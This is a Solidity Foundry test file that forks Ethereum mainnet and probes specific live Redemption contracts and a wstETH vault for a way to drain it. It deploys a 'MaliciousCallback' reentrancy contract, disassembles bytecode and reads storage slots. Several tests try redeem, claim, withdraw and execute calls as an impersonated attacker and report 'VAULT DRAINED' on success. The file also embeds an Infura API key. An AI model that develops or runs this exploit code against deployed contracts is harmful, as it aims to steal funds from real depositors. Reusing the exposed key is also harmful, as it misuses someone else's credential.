// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// Malicious callback contract
contract MaliciousCallback {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    // When called back from Redemption, we're in their context
    fallback() external payable {
        // Try to call RC.redeem as Redemption
        (bool success, ) = RC.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100 ether, attacker)
        );
    }

    receive() external payable {}
}

contract CallPatternExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;
    MaliciousCallback callback;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
        callback = new MaliciousCallback(attacker);
    }

    function test_AnalyzeCallAtOffset46() public view {
        console.log("=== ANALYZING CALL AT OFFSET 46 ===\n");

        bytes memory code = REDEMPTION_0.code;

        // The CALL at offset 46 has CALLDATALOAD before
        // Let's see the exact bytecode pattern
        console.log("Bytecode around offset 46:");
        for (uint i = 30; i < 70 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x35) console.log(i, "CALLDATALOAD");
            else if (op == 0xf1) console.log(i, "CALL");
            else if (op == 0xf2) console.log(i, "CALLCODE");
            else if (op == 0xf4) console.log(i, "DELEGATECALL");
            else if (op == 0xfa) console.log(i, "STATICCALL");
            else if (op == 0x54) console.log(i, "SLOAD");
            else if (op == 0x51) console.log(i, "MLOAD");
            else if (op == 0x52) console.log(i, "MSTORE");
            else if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                if (size <= 4 && i + size < code.length) {
                    uint256 val = 0;
                    for (uint j = 0; j < size; j++) {
                        val = val << 8 | uint8(code[i + 1 + j]);
                    }
                    console.log(i, "PUSH size:", size);
                    console.log("  Value:", val);
                }
                i += size; // Skip the push data
            }
        }
    }

    function test_Redemption1DifferentFunctions() public view {
        console.log("=== REDEMPTION_1 DIFFERENT FUNCTIONS ===\n");

        // REDEMPTION_1 might have different/fewer access controls
        // Let's find its function selectors

        bytes memory code = REDEMPTION_1.code;

        console.log("Function selectors in REDEMPTION_1:");
        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));

                // Check for known selectors
                if (sel == bytes4(keccak256("redeem(uint96)"))) {
                    console.log("  Found redeem(uint96) at:", i);
                } else if (sel == bytes4(keccak256("finalizeRedeem(uint256)"))) {
                    console.log("  Found finalizeRedeem(uint256) at:", i);
                } else if (sel == bytes4(keccak256("cancelRedeem(uint256)"))) {
                    console.log("  Found cancelRedeem(uint256) at:", i);
                }

                // Print all unique selectors
                console.logBytes4(sel);
            }
        }
    }

    function test_TryCallbackExploit() public {
        console.log("=== TRYING CALLBACK EXPLOIT ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // Give attacker IAU tokens
        deal(IAU, attacker, 10000e18);

        vm.startPrank(attacker);

        // Approve Redemption to spend IAU
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Try various functions that might trigger callback to our contract

        // 1. Try calling redeem with callback address somehow encoded
        console.log("\nTrying redeem with various params...");

        // Standard redeem
        (bool success, bytes memory data) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(200e18))
        );
        console.log("redeem(200e18) success:", success);
        if (!success && data.length >= 4) {
            console.logBytes4(bytes4(data));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        if (attackerAfter > attackerBefore) {
            console.log("\n*** CALLBACK EXPLOIT WORKED! ***");
            console.log("Attacker gained:", (attackerAfter - attackerBefore) / 1e18, "wstETH");
        }
    }

    function test_Redemption1Entry() public {
        console.log("=== TRYING REDEMPTION_1 ENTRY POINTS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        deal(IAU, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Try REDEMPTION_1 which has different code
        console.log("\nTrying REDEMPTION_1 redeem...");
        (bool success1, bytes memory data1) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(200e18))
        );
        console.log("REDEMPTION_1 redeem success:", success1);
        if (!success1 && data1.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(data1));
        }

        // Try other potential functions
        console.log("\nTrying other functions on REDEMPTION_1...");

        (bool success2,) = REDEMPTION_1.call(
            abi.encodeWithSignature("claim()")
        );
        console.log("claim() success:", success2);

        (bool success3,) = REDEMPTION_1.call(
            abi.encodeWithSignature("withdraw(uint256)", 100e18)
        );
        console.log("withdraw() success:", success3);

        (bool success4,) = REDEMPTION_1.call(
            abi.encodeWithSignature("execute(bytes)", abi.encode(attacker, 100e18))
        );
        console.log("execute() success:", success4);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED VIA REDEMPTION_1! ***");
        }
    }

    function test_ExploreRedemption1Storage() public view {
        console.log("=== EXPLORING REDEMPTION_1 STORAGE ===\n");

        // REDEMPTION_1 has different addresses in storage
        // Slot 0: 0x2225dabffc7f862c99477381e971e8b1fdab467e (owner?)
        // Slot 4: 0xb38f2acb7b562475908c0c6e80a045deb4023f70 (different!)
        // Slot 5: 0x434b68b11bbe8fd3074089397ca3d275801d6354 (different!)

        address slot4Addr = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
        address slot5Addr = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

        console.log("REDEMPTION_1 Slot 4 address:", slot4Addr);
        console.log("  Code size:", slot4Addr.code.length);

        console.log("\nREDEMPTION_1 Slot 5 address:", slot5Addr);
        console.log("  Code size:", slot5Addr.code.length);

        // Check if these are related contracts
        // Are they also in RC's redemption list?
        console.log("\nChecking if slot4Addr is registered in RC...");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = keccak256(abi.encode(slot4Addr, uint256(4)));
            bytes32 val = vm.load(REDEMPTION_CONTROLLER, slot);
            if (val != bytes32(0)) {
                console.log("  Found in RC mapping at base 4:");
                console.logBytes32(val);
            }
        }
    }

    function test_CompareStorageLayouts() public view {
        console.log("=== COMPARING STORAGE LAYOUTS ===\n");

        console.log("REDEMPTION_0 storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        console.log("\nREDEMPTION_1 storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(REDEMPTION_1, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check if same implementation?
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);

        bytes32 impl0 = vm.load(REDEMPTION_0, implSlot);
        bytes32 impl1 = vm.load(REDEMPTION_1, implSlot);

        console.log("\nEIP-1967 implementation slots:");
        console.log("REDEMPTION_0 impl:");
        console.logBytes32(impl0);
        console.log("REDEMPTION_1 impl:");
        console.logBytes32(impl1);
    }
}
